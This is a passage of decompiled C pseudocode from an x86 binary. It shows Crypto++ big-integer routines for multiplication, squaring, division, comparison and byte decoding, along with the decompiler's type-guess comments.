  v34 = 2 * (HIDWORD(v32) + ((v31 + a2[6] * (unsigned __int64)a2[1]) >> 32) + ((a2[7] * (unsigned __int64)*a2) >> 32))
      + 2 * HIDWORD(v33)
      + ((unsigned int)v33 >> 31);
  HIDWORD(v31) = a2;
  LODWORD(v31) = 2 * v33 + v64;
  v35 = __CFADD__(v34, (__PAIR64__(v34, 2 * (int)v33) + v64) >> 32);
  HIDWORD(v64) = (__PAIR64__(v34, 2 * (int)v33) + v64) >> 32;
  LODWORD(v64) = HIDWORD(v29) + v35;
  a1[7] = v31;
  v36 = (unsigned int)(*(_DWORD *)(HIDWORD(v31) + 28) * *(_DWORD *)(HIDWORD(v31) + 4))
      + *(unsigned int *)(HIDWORD(v31) + 24) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 8);
  v37 = (unsigned int)v36 + a2[5] * (unsigned __int64)a2[3];
  v38 = 2
      * (HIDWORD(v36)
       + ((*(unsigned int *)(HIDWORD(v31) + 28) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 4)) >> 32))
      + 2i64 * HIDWORD(v37)
      + ((unsigned int)v37 >> 31);
  HIDWORD(v31) = HIDWORD(v38);
  v39 = (unsigned int)(2 * v37) + a2[4] * (unsigned __int64)a2[4];
  v41 = v39 + __PAIR64__(v64, HIDWORD(v64));
  LODWORD(v31) = HIDWORD(v41);
  v40 = v41;
  v42 = v38 + ((v39 + __PAIR64__(v64, HIDWORD(v64))) >> 32);
  LODWORD(v39) = (__PAIR64__(
                    (HIDWORD(v39) + (unsigned __int64)(__CFADD__((_DWORD)v39, HIDWORD(v64)) + (unsigned int)v64)) >> 32,
                    v38)
                + v31) >> 32;
  a1[8] = v40;
  v43 = a2[7] * a2[2] + a2[6] * (unsigned __int64)a2[3];
  v44 = v43 + a2[5] * a2[4];
  v45 = 2 * (HIDWORD(v43) + ((a2[7] * (unsigned __int64)a2[2]) >> 32))
      + (v44 >> 31)
      + 2 * (((unsigned int)v43 + a2[5] * (unsigned __int64)a2[4]) >> 32);
  HIDWORD(v31) = a2;
  v46 = __PAIR64__(v45, 2 * v44) + __PAIR64__(v39, v42);
  LODWORD(v64) = ((2 * (HIDWORD(v43) + ((a2[7] * (unsigned __int64)a2[2]) >> 32))
                 + (v44 >> 31)
                 + 2 * (((unsigned int)v43 + a2[5] * (unsigned __int64)a2[4]) >> 32)) >> 32)
               + __CFADD__(v45, (__PAIR64__(v45, 2 * v44) + __PAIR64__(v39, v42)) >> 32);
  a1[9] = 2 * v44 + v42;
  v47 = *(unsigned int *)(HIDWORD(v31) + 28) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 12);
  v48 = *(unsigned int *)(HIDWORD(v31) + 24) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 16)
      + (unsigned int)v47;
  HIDWORD(v31) = a2;
  v49 = a2[5] * (unsigned __int64)a2[5] + (unsigned int)(2 * v48);
  v50 = (unsigned int)v49 + __PAIR64__(v64, HIDWORD(v46));
  a1[10] = v50;
  v51 = *(unsigned int *)(HIDWORD(v31) + 28) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 16);
  v52 = *(unsigned int *)(HIDWORD(v31) + 24) * (unsigned __int64)*(unsigned int *)(HIDWORD(v31) + 20)
      + (unsigned int)v51;
  v53 = (unsigned int)(2 * v52)
      + 2i64 * HIDWORD(v47)
      + ((unsigned int)v48 >> 31)
      + 2i64 * HIDWORD(v48)
      + HIDWORD(v49)
      + (unsigned __int64)HIDWORD(v50);
  a1[11] = v53;
  v54 = 2 * ((a2[7] * (unsigned __int64)a2[5]) >> 32) + ((a2[7] * a2[5]) >> 31);
  v55 = 2 * a2[7] * a2[5] + a2[6] * (unsigned __int64)a2[6];
  v56 = HIDWORD(v55)
      + ((2i64 * HIDWORD(v51)
        + 2i64 * HIDWORD(v52)
        + ((unsigned int)v52 >> 31)
        + HIDWORD(v53)
        + (unsigned __int64)(unsigned int)v55) >> 32);
  a1[12] = 2 * HIDWORD(v51) + 2 * HIDWORD(v52) + ((unsigned int)v52 >> 31) + HIDWORD(v53) + v55;
  v58 = a2[7] * (unsigned __int64)a2[6];
  v59 = __CFADD__(2 * v58, v54 + v56) + ((v54 + v56) >> 32);
  a1[13] = 2 * v58 + v54 + v56;
  result = a1;
  v61 = ((unsigned int)v58 >> 31) + 2i64 * HIDWORD(v58) + a2[7] * (unsigned __int64)a2[7];
  a1[14] = v59 + v61;
  a1[15] = __CFADD__(v59, (_DWORD)v61) + HIDWORD(v61);
  return result;
}

//----- (00440BD0) --------------------------------------------------------
unsigned int __thiscall sub_440BD0(_DWORD *this)
{
  int v1; // edx
  int v2; // esi
  _DWORD *i; // eax

  v1 = this[4];
  v2 = this[3];
  if ( !v2 )
    return 0;
  for ( i = (_DWORD *)(v1 + 4 * (v2 - 1)); !*i; --i )
  {
    if ( !--v2 )
      return 0;
  }
  return 32 * v2 + sub_4327F0((_DWORD *)(v1 - 4 + 4 * v2)) - 32;
}
// 440BF4: conditional instruction was optimized away because esi.4!=0

//----- (00440C10) --------------------------------------------------------
int __thiscall sub_440C10(_DWORD *this)
{
  int v1; // eax
  int v2; // edi
  _DWORD *i; // ecx
  int v5; // ebx
  unsigned int v6; // edi
  unsigned int v7; // esi
  unsigned int v8; // edx
  unsigned int v9; // ecx

  v1 = this[3];
  v2 = this[4];
  if ( !v1 )
    return 0;
  for ( i = (_DWORD *)(v2 + 4 * (v1 - 1)); !*i; --i )
  {
    if ( !--v1 )
      return 0;
  }
  v5 = 4 * v1;
  v6 = *(_DWORD *)(4 * v1 + v2 - 4);
  if ( !v6 )
    return v5 - 4;
  v7 = 0;
  v8 = 32;
  do
  {
    v9 = (v8 + v7) >> 1;
    if ( !(v6 >> v9) )
    {
      v8 = (v8 + v7) >> 1;
      v9 = v7;
    }
    v7 = v9;
  }
  while ( v8 - v9 > 8 );
  return (v8 >> 3) + v5 - 4;
}
// 440C34: conditional instruction was optimized away because eax.4!=0

//----- (00440C80) --------------------------------------------------------
_DWORD *__thiscall sub_440C80(int this, _DWORD *a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  unsigned int v8; // edx
  void *v9; // esi
  unsigned int v10; // edx
  void *v11; // esi
  unsigned int v12; // edx
  void *v13; // esi
  _DWORD v15[31]; // [esp+Ch] [ebp-D0h] BYREF
  int v16; // [esp+88h] [ebp-54h] BYREF
  unsigned int v17; // [esp+90h] [ebp-4Ch]
  unsigned int v18; // [esp+94h] [ebp-48h]
  void *v19; // [esp+98h] [ebp-44h]
  int v20; // [esp+A0h] [ebp-3Ch] BYREF
  unsigned int v21; // [esp+A8h] [ebp-34h]
  unsigned int v22; // [esp+ACh] [ebp-30h]
  void *v23; // [esp+B0h] [ebp-2Ch]
  _DWORD v24[2]; // [esp+B8h] [ebp-24h] BYREF
  unsigned int v25; // [esp+C0h] [ebp-1Ch]
  unsigned int v26; // [esp+C4h] [ebp-18h]
  void *Block; // [esp+C8h] [ebp-14h]
  int v28; // [esp+D8h] [ebp-4h]

  if ( *(_DWORD *)(this + 24) && (**(_BYTE **)(this + 28) & 1) != 0 )
  {
    sub_43D720(v15, (_DWORD *)(this + 12));
    v28 = 0;
    v6 = sub_43B010(v15, &v16, a5);
    LOBYTE(v28) = 1;
    v7 = sub_43B010(v15, &v20, a3);
    LOBYTE(v28) = 2;
    sub_43A8E0(v15, v24, v7, a4, v6, a6);
    LOBYTE(v28) = 3;
    sub_440F70(v15, a2, (int)v24);
    v8 = v26;
    v9 = Block;
    if ( v25 < v26 )
      v8 = v25;
    LOBYTE(v28) = 4;
    memset(Block, 0, 4 * v8);
    if ( v8 )
      j_j_unknown_libname_61(v9);
    else
      j_j___free_base(v9);
    v10 = v22;
    v11 = v23;
    if ( v21 < v22 )
      v10 = v21;
    LOBYTE(v28) = 5;
    memset(v23, 0, 4 * v10);
    if ( v10 )
      j_j_unknown_libname_61(v11);
    else
      j_j___free_base(v11);
    v12 = v18;
    v13 = v19;
    if ( v17 < v18 )
      v12 = v17;
    LOBYTE(v28) = 6;
    memset(v19, 0, 4 * v12);
    if ( v12 )
      j_j_unknown_libname_61(v13);
    else
      j_j___free_base(v13);
    sub_439FE0((int)v15);
    return a2;
  }
  else
  {
    sub_43A8E0((void *)this, a2, a3, a4, a5, a6);
    return a2;
  }
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 440C80: using guessed type _DWORD var_D0[31];
// 440C80: using guessed type _DWORD var_24[2];

//----- (00440E30) --------------------------------------------------------
void *__thiscall sub_440E30(int this, unsigned int a2)
{
  void *result; // eax
  char *v4; // eax
  int v5; // edx

  result = *(void **)(this + 8);
  if ( a2 > (unsigned int)result )
  {
    v4 = (char *)sub_43CD80(*(void **)(this + 12), (unsigned int)result, a2, 1);
    v5 = *(_DWORD *)(this + 8);
    *(_DWORD *)(this + 12) = v4;
    result = memset(&v4[4 * v5], 0, 4 * (a2 - v5));
    *(_DWORD *)(this + 8) = a2;
  }
  *(_DWORD *)(this + 4) = 0x3FFFFFFF;
  return result;
}

//----- (00440E80) --------------------------------------------------------
void __thiscall sub_440E80(_DWORD *this, unsigned int a2)
{
  int v3; // ebp
  void *v4; // edx

  v3 = this[2];
  v4 = (void *)this[3];
  if ( v3 != a2 )
  {
    memset(v4, 0, 4 * v3);
    if ( v3 )
      j_j_unknown_libname_61(v4);
    else
      j_j___free_base(v4);
    v4 = (void *)sub_41E7A0(a2, 0);
  }
  this[3] = v4;
  this[2] = a2;
  if ( v4 )
    memset(v4, 0, 4 * a2);
  this[1] = 0x3FFFFFFF;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00440EF0) --------------------------------------------------------
int __cdecl sub_440EF0(int a1, int a2, int a3)
{
  int v3; // ecx
  unsigned int *v4; // edx
  unsigned int v5; // eax

  v3 = a3;
  if ( !a3 )
    return 0;
  v4 = (unsigned int *)(a2 + 4 * a3);
  while ( 1 )
  {
    v5 = *(unsigned int *)((char *)v4-- + a1 - a2 - 4);
    --v3;
    if ( v5 > *v4 )
      break;
    if ( v5 < *v4 )
      return -1;
    if ( !v3 )
      return 0;
  }
  return 1;
}

//----- (00440F30) --------------------------------------------------------
int __thiscall sub_440F30(_DWORD *this, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( this[5] == 1 )
  {
    if ( v2 == 1 )
      return -sub_443E50(this, a2);
    else
      return -1;
  }
  else if ( v2 == 1 )
  {
    return 1;
  }
  else
  {
    return sub_443E50(this, a2);
  }
}

//----- (00440F70) --------------------------------------------------------
_DWORD *__thiscall sub_440F70(_DWORD *this, _DWORD *a2, int a3)
{
  char *v4; // ebx
  void *v5; // edx
  char *v6; // ecx
  unsigned int v7; // ebp
  int v8; // eax
  void *v10; // [esp+10h] [ebp-4h]

  v4 = (char *)this[30];
  v5 = (void *)this[13];
  v6 = *(char **)(a3 + 16);
  v7 = this[6];
  v8 = *(_DWORD *)(a3 + 12);
  v10 = v5;
  if ( v4 != v6 )
  {
    sub_438F30(v4, 4 * v8, v6, 4 * v8);
    v8 = *(_DWORD *)(a3 + 12);
    v5 = v10;
  }
  if ( 2 * v7 != v8 )
    memset(&v4[4 * v8], 0, 4 * (2 * v7 - v8));
  sub_4434C0(v5, (int)&v4[8 * v7], (int)v4, this[7], this[25], v7);
  sub_43D420(a2, this + 9);
  return a2;
}

//----- (00440FF0) --------------------------------------------------------
int __thiscall sub_440FF0(int this)
{
  int result; // eax

  result = **(_DWORD **)(this + 16);
  if ( *(_DWORD *)(this + 20) )
    return -**(_DWORD **)(this + 16);
  return result;
}

//----- (00441010) --------------------------------------------------------
int __cdecl sub_441010(void *a1, void *a2, int a3)
{
  int result; // eax

  if ( a1 != a2 )
    return sub_438F30(a1, 4 * a3, a2, 4 * a3);
  return result;
}

//----- (00441030) --------------------------------------------------------
void __thiscall sub_441030(_DWORD *this, int a2)
{
  char v3; // bl
  unsigned int v4; // eax
  int v5; // esi
  int v6; // eax
  unsigned int v7; // edx
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  char v10; // al
  unsigned int v11; // eax
  char v12[24]; // [esp+10h] [ebp-78h] BYREF
  _DWORD v13[6]; // [esp+28h] [ebp-60h] BYREF
  int v14; // [esp+40h] [ebp-48h]
  char v15; // [esp+47h] [ebp-41h]
  _DWORD v16[12]; // [esp+48h] [ebp-40h] BYREF
  int v17; // [esp+84h] [ebp-4h]

  v3 = 0;
  v14 = 0;
  sub_432BF0(v16, a2, 2);
  v17 = 0;
  v4 = sub_440C10(this);
  v5 = 1;
  if ( v4 > 1 )
    v5 = v4;
  v6 = this[5];
  if ( v6 != 1 )
  {
    v7 = (unsigned int)(v5 - 1) >> 2;
    if ( v7 < this[3] )
    {
      v6 = this[5];
      if ( ((*(_DWORD *)(this[4] + 4 * v7) >> (8 * ((v5 - 1) & 3))) & 0x80u) != 0 )
        ++v5;
    }
    if ( v6 != 1 )
      goto LABEL_9;
  }
  v8 = (_DWORD *)sub_4443D0((int)v12, 8 * v5 - 1);
  LOBYTE(v17) = 1;
  v14 = 1;
  v9 = sub_43E040(v8, v13);
  v3 = 3;
  v10 = sub_43E190(this, (int)v9);
  v15 = 1;
  if ( !v10 )
LABEL_9:
    v15 = 0;
  if ( (v3 & 2) != 0 )
  {
    v3 &= ~2u;
    sub_4066A0((int)v13);
  }
  v17 = 0;
  if ( (v3 & 1) != 0 )
    sub_4066A0((int)v12);
  v11 = v5 + 1;
  if ( !v15 )
    v11 = v5;
  sub_441AE0(this, (int)v16, v11, 1);
  sub_434250((int)v16);
  sub_432CF0((int)v16);
}
// 441030: using guessed type _DWORD var_40[12];
// 441030: using guessed type _DWORD var_60[6];

//----- (00441170) --------------------------------------------------------
void __thiscall sub_441170(int this, int a2, unsigned int a3, int a4)
{
  unsigned __int64 v5; // rax
  unsigned int v6; // esi
  unsigned __int8 v7; // cl
  BOOL v8; // eax
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  unsigned int v12; // esi
  _DWORD *v13; // edx
  char v14; // cl
  unsigned int i; // ecx
  _DWORD *v16; // edx
  char v17; // cl
  unsigned int v18; // [esp+14h] [ebp-58h]
  unsigned __int8 v19; // [esp+1Bh] [ebp-51h] BYREF
  char pExceptionObject[40]; // [esp+1Ch] [ebp-50h] BYREF
  _DWORD v21[10]; // [esp+44h] [ebp-28h] BYREF

  LODWORD(v5) = (*(int (__thiscall **)(int))(*(_DWORD *)a2 + 64))(a2);
  v6 = a3;
  if ( v5 < a3 )
  {
    sub_419B80((int)v21, "Integer: input length is too small");
    v21[9] = 0;
    sub_405230(pExceptionObject, v21);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)a2 + 84))(a2, &v19);
  v7 = v19;
  v8 = a4 == 1 && (v19 & 0x80u) != 0;
  *(_DWORD *)(this + 20) = v8;
  if ( a3 )
  {
    while ( 1 )
    {
      v9 = 0;
      v10 = *(_DWORD *)(this + 20) ? v7 == 0xFF : v7 == 0;
      LOBYTE(v9) = v10;
      if ( !v9 )
        break;
      (*(void (__thiscall **)(int, int, _DWORD))(*(_DWORD *)a2 + 88))(a2, 1, 0);
      (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)a2 + 84))(a2, &v19);
      if ( !--v6 )
        break;
      v7 = v19;
    }
    a3 = v6;
  }
  v11 = sub_444C00((v6 + 3) >> 2);
  sub_440E80((_DWORD *)(this + 4), v11);
  if ( v6 )
  {
    v18 = v6;
    v12 = v6 - 1;
    do
    {
      (*(void (__thiscall **)(int, unsigned __int8 *))(*(_DWORD *)a2 + 76))(a2, &v19);
      v13 = (_DWORD *)(*(_DWORD *)(this + 16) + 4 * (v12 >> 2));
      v14 = v12--;
      *v13 |= v19 << (8 * (v14 & 3));
      --v18;
    }
    while ( v18 );
    v6 = a3;
  }
  if ( *(_DWORD *)(this + 20) == 1 )
  {
    for ( i = *(_DWORD *)(this + 12); v6 < 4 * i; i = *(_DWORD *)(this + 12) )
    {
      v16 = (_DWORD *)(*(_DWORD *)(this + 16) + 4 * (v6 >> 2));
      v17 = 8 * (v6++ & 3);
      *v16 |= 255 << v17;
    }
    sub_44E4E0(*(unsigned int **)(this + 16), i);
  }
}
// 4411B8: variable 'v5' is possibly undefined

//----- (00441320) --------------------------------------------------------
int __cdecl sub_441320(unsigned int *a1, unsigned int a2, int a3)
{
  unsigned int v3; // ecx
  unsigned int v4; // eax
  int v5; // eax
  unsigned int v6; // edx

  v3 = *a1;
  v4 = *a1 - a3;
  *a1 = v4;
  if ( v4 > v3 )
  {
    v5 = 1;
    if ( a2 <= 1 )
      return 1;
    while ( 1 )
    {
      v6 = a1[v5];
      a1[v5] = v6 - 1;
      if ( v6 )
        break;
      if ( ++v5 >= a2 )
        return 1;
    }
  }
  return 0;
}

//----- (00441360) --------------------------------------------------------
_DWORD *__thiscall sub_441360(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  unsigned int v6; // edx
  void *v7; // esi
  int v9; // [esp+10h] [ebp-24h] BYREF
  unsigned int v10; // [esp+18h] [ebp-1Ch]
  unsigned int v11; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v13; // [esp+30h] [ebp-4h]

  v4 = sub_43E090(&v9, a2, a3);
  v13 = 0;
  v5 = sub_43DBB0(this + 9, v4);
  v6 = v11;
  v7 = Block;
  if ( v10 < v11 )
    v6 = v10;
  v13 = 1;
  memset(Block, 0, 4 * v6);
  if ( v6 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  return v5;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (00441400) --------------------------------------------------------
int __cdecl sub_441400(_DWORD *a1, int a2, _DWORD *a3, _DWORD *a4, int a5, char *a6, unsigned int a7)
{
  int v7; // ebx
  char *v8; // ebp
  bool v10; // zf
  char *v11; // edi
  char *v12; // esi
  unsigned int v13; // edi
  unsigned int v14; // edx
  unsigned int v15; // esi
  unsigned int v16; // ecx
  int v17; // edi
  int v18; // ecx
  size_t v19; // esi
  _DWORD *v20; // edx
  int v21; // eax
  _DWORD *v22; // ecx
  char *v23; // edi
  unsigned int v24; // ecx
  unsigned int *v25; // eax
  int v26; // edi
  unsigned int v27; // edx
  int v28; // eax
  size_t v29; // edi
  unsigned int v30; // ecx
  int *v31; // esi
  int v32; // edx
  int v33; // edi
  int v34; // edi
  int v35; // ecx
  _DWORD *v36; // edx
  int v37; // eax
  _BYTE *v39; // [esp+10h] [ebp-24h]
  size_t v40; // [esp+14h] [ebp-20h]
  char *v41; // [esp+14h] [ebp-20h]
  _DWORD *v42; // [esp+1Ch] [ebp-18h]
  int v43; // [esp+20h] [ebp-14h]
  int v44; // [esp+24h] [ebp-10h] BYREF
  int v45[3]; // [esp+28h] [ebp-Ch] BYREF
  _DWORD *v46; // [esp+44h] [ebp+10h]
  int v47; // [esp+44h] [ebp+10h]
  int v48; // [esp+48h] [ebp+14h]
  int v49; // [esp+4Ch] [ebp+18h]
  int v50; // [esp+4Ch] [ebp+18h]
  int v51; // [esp+4Ch] [ebp+18h]

  v7 = a7;
  v8 = (char *)&a3[a5 + 2];
  v39 = &a3[a7 + 2 + a5];
  v10 = *(_DWORD *)&a6[4 * a7 - 4] == 0;
  v11 = &v8[4 * a7];
  *((_DWORD *)v11 - 1) = 0;
  *(_DWORD *)v8 = 0;
  v12 = &v8[4 * v10];
  v49 = v10;
  if ( v12 != a6 )
    sub_438F30(v12, 4 * (a7 - v10), a6, 4 * (a7 - v10));
  v13 = *((_DWORD *)v11 - 1);
  if ( v13 )
  {
    v15 = 0;
    v14 = 32;
    do
    {
      v16 = (v14 + v15) >> 1;
      if ( !(v13 >> v16) )
      {
        v14 = (v14 + v15) >> 1;
        v16 = v15;
      }
      v15 = v16;
    }
    while ( v14 - v16 > 1 );
  }
  else
  {
    v14 = 0;
  }
  v17 = 32 - v14;
  v43 = 32 - v14;
  sub_44DA50((int)v8, a7, 32 - v14);
  v18 = (int)a3;
  v19 = 4 * a5;
  v40 = v19;
  v42 = &a3[v49];
  *(_DWORD *)((char *)a3 + v19 + 4) = 0;
  *(_DWORD *)((char *)a3 + v19) = 0;
  *a3 = 0;
  if ( &a3[v49] != a4 )
  {
    sub_438F30(&a3[v49], v19, a4, v19);
    v18 = (int)a3;
  }
  sub_44DA50(v18, a5 + 2, v17);
  v20 = a3;
  if ( *(_QWORD *)((char *)a3 + v19) > 1ui64 )
  {
    a5 += 2;
  }
  else
  {
    v21 = 4 * (a5 - a7);
    v50 = v21;
    v22 = (_DWORD *)(v21 + a2);
    *v22 = 0;
    v46 = (_DWORD *)(v21 + a2);
    v22[1] = 0;
    while ( 1 )
    {
      if ( !*(_DWORD *)((char *)v20 + v19) )
      {
        v23 = (char *)v20 + v21;
        v24 = a7;
        if ( a7 )
          break;
      }
LABEL_20:
      v28 = off_4E8030((int)v20 + v21, (int)v8);
      v20 = a3;
      *(_DWORD *)((char *)a3 + v19) -= v28;
      ++*v46;
      v21 = v50;
    }
    v25 = (unsigned int *)&v8[4 * a7];
    v26 = v23 - v8;
    while ( 1 )
    {
      v27 = *(unsigned int *)((char *)v25-- + v26 - 4);
      --v24;
      if ( v27 > *v25 )
      {
LABEL_19:
        v20 = a3;
        v19 = v40;
        v21 = v50;
        goto LABEL_20;
      }
      if ( v27 < *v25 )
        break;
      if ( !v24 )
        goto LABEL_19;
    }
    v20 = a3;
  }
  v29 = 4 * a7;
  v47 = *(_DWORD *)&v8[4 * a7 - 8] + 1;
  v30 = a5 - 2;
  v51 = (v47 == 0) + *(_DWORD *)&v8[4 * a7 - 4];
  v48 = v30;
  if ( v30 >= a7 )
  {
    v31 = (int *)(a2 + 4 * (v30 - a7));
    v41 = (char *)v20 - a2;
    do
    {
      v32 = v20[v30];
      v33 = a3[v30 + 1];
      if ( v51 | v47 )
      {
        v44 = a3[v30 - 2];
        v45[0] = a3[v30 - 1];
        v45[1] = v32;
        v45[2] = v33;
        v33 = sub_43CF40(v45, __PAIR64__(v51, v47));
        v32 = sub_43CF40(&v44, __PAIR64__(v51, v47));
      }
      v7 = a7;
      *v31 = v32;
      v31[1] = v33;
      sub_43EF80(v39, (int)&v39[4 * a7 + 8], (int)v31, 2u, (int)v8, a7);
      v34 = (int)&v41[(_DWORD)v31];
      off_4E8030((int)&v41[(_DWORD)v31], (int)v39);
      v35 = v48;
      v36 = a3;
      while ( v36[v35] || sub_440EF0(v34, (int)v8, a7) >= 0 )
      {
        v37 = off_4E8030(v34, (int)v8);
        v35 = v48;
        v36 = a3;
        a3[v48] -= v37;
        v10 = (*v31)++ == -1;
        v31[1] += v10;
      }
      v31 -= 2;
      v20 = a3;
      v30 = v48 - 2;
      v48 = v30;
    }
    while ( v30 >= a7 );
    v29 = 4 * a7;
  }
  if ( a1 != v42 )
    sub_438F30(a1, v29, v42, v29);
  return sub_44DAA0((int)a1, v7, v43);
}
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (00441740) --------------------------------------------------------
int __cdecl sub_441740(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // ecx
  int v5; // eax
  _DWORD *v6; // ecx
  _DWORD *v7; // eax
  int result; // eax
  _DWORD v9[6]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD v10[6]; // [esp+28h] [ebp-24h] BYREF
  int v11; // [esp+48h] [ebp-4h]

  sub_443EC0((int)a1, a2, a3, (int)a4);
  if ( a3[5] != 1 )
    goto LABEL_10;
  sub_443BC0(a2);
  if ( a1[5] != 1 )
  {
    v4 = (_DWORD *)a1[4];
    if ( !*v4 )
    {
      v5 = a1[3];
      if ( !v5 )
        goto LABEL_10;
      v6 = &v4[v5 - 1];
      while ( !*v6 )
      {
        --v6;
        if ( !--v5 )
          goto LABEL_10;
      }
    }
  }
  sub_43DEB0(a2);
  sub_43D420(v10, a4);
  v10[5] = 0;
  v11 = 0;
  v7 = sub_43DF90(v9, (int)v10, (int)a1);
  LOBYTE(v11) = 1;
  sub_43DBB0(a1, v7);
  sub_4066A0((int)v9);
  sub_4066A0((int)v10);
LABEL_10:
  result = (int)a4;
  if ( a4[5] == 1 )
    return sub_443BC0(a2);
  return result;
}
// 4417C1: conditional instruction was optimized away because eax.4!=0
// 441740: using guessed type _DWORD var_3C[6];

//----- (00441840) --------------------------------------------------------
int __cdecl sub_441840(_BYTE *a1, _BYTE *a2, int a3, int a4, int a5)
{
  _BYTE *v5; // ecx
  int result; // eax
  int v7; // ebp
  int v8; // esi
  int v9; // edi
  unsigned int *v10; // eax
  unsigned int v11; // edx
  int v12; // ecx
  int v13; // eax
  int v14; // esi
  int v15; // edi
  unsigned int *v16; // edx
  unsigned int v17; // ecx
  int v18; // eax
  int v19; // [esp+Ch] [ebp+8h]
  int v20; // [esp+10h] [ebp+Ch]

  v5 = a1;
  if ( a1 != a2 )
  {
    sub_438F30(a1, 4 * a5, a2, 4 * a5);
    v5 = a1;
  }
  result = a3;
  if ( a3 )
  {
    v7 = 4 * a5;
    do
    {
      v20 = --result;
      if ( (*v5 & 1) != 0 )
      {
        v13 = off_4E802C(v5, a4);
        v14 = 0;
        v19 = v13;
        v15 = a5;
        if ( a5 )
        {
          v16 = (unsigned int *)&a1[v7 - 4];
          do
          {
            v17 = *v16--;
            v18 = v14 | (v17 >> 1);
            v14 = v17 << 31;
            v16[1] = v18;
            --v15;
          }
          while ( v15 );
          v13 = v19;
        }
        v5 = a1;
        *(_DWORD *)&a1[v7 - 4] += v13 << 31;
        result = v20;
      }
      else
      {
        v8 = 0;
        v9 = a5;
        if ( a5 )
        {
          v10 = (unsigned int *)&v5[4 * a5 - 4];
          do
          {
            v11 = *v10--;
            v12 = v8 | (v11 >> 1);
            v8 = v11 << 31;
            v10[1] = v12;
            --v9;
          }
          while ( v9 );
          v5 = a1;
          result = v20;
        }
        v7 = 4 * a5;
      }
    }
    while ( result );
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);

//----- (00441920) --------------------------------------------------------
_DWORD *__thiscall sub_441920(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // edx
  void *v6; // ebx
  void **v8; // [esp+10h] [ebp-28h] BYREF
  unsigned int v9; // [esp+18h] [ebp-20h]
  unsigned int v10; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v12; // [esp+24h] [ebp-14h]
  int v13; // [esp+28h] [ebp-10h]
  int v14; // [esp+34h] [ebp-4h]

  v14 = 0;
  v13 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v8 = &CryptoPP::Integer::`vftable';
  v9 = 0x3FFFFFFF;
  v10 = 2;
  v4 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v4;
  v12 = 0;
  v4[1] = 0;
  *v4 = 0;
  v14 = 1;
  sub_43D6C0(a2);
  v13 = 1;
  sub_441740(&v8, a2, this, a3);
  v5 = v10;
  v6 = Block;
  if ( v9 < v10 )
    v5 = v9;
  v14 = 2;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return a2;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (00441A20) --------------------------------------------------------
int __stdcall sub_441A20(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  return sub_441740(a1, a2, a3, a4);
}

//----- (00441A40) --------------------------------------------------------
_DWORD *__thiscall sub_441A40(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // ebx
  unsigned int v4; // edx
  void *v5; // esi
  _DWORD v7[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v8; // [esp+18h] [ebp-1Ch]
  unsigned int v9; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v11; // [esp+30h] [ebp-4h]

  sub_443C50(a2, v7, (int)a2);
  v11 = 0;
  v3 = sub_43DBB0(this + 9, v7);
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  v11 = 1;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v3;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 441A40: using guessed type _DWORD var_24[2];

//----- (00441AE0) --------------------------------------------------------
void __thiscall sub_441AE0(_DWORD *this, int a2, unsigned int a3, int a4)
{
  unsigned int v5; // eax
  unsigned int v6; // esi
  _DWORD *v7; // eax
  unsigned int v8; // ebx
  unsigned int v9; // esi
  int v10; // eax
  char v11[24]; // [esp+10h] [ebp-3Ch] BYREF
  _DWORD v12[6]; // [esp+28h] [ebp-24h] BYREF
  int v13; // [esp+48h] [ebp-4h]

  if ( a4 && this[5] == 1 )
  {
    v5 = sub_440C10(this);
    v6 = a3;
    if ( v5 < a3 )
      v5 = a3;
    v7 = (_DWORD *)sub_4443D0((int)v11, 8 * v5);
    v13 = 0;
    sub_443C50(v7, v12, (int)this);
    LOBYTE(v13) = 2;
    sub_4066A0((int)v11);
    sub_441AE0(a2, v6, 0);
    sub_4066A0((int)v12);
